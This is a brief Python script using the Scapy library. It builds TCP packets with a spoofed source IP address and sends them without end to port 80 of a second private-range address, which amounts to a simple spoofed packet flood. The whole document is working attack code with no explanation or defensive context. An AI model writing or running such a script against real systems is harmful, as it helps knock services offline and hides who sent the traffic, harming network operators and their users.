from scapy.all import *

A = "172.16.8.75"   # Spoofed source IP address
B = "172.16.7.75" # Destination IP address
C = RandShort()     # Source port (random)
D = 80              # Destination port
payload = "yada yada yada" # Packet payload

while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet)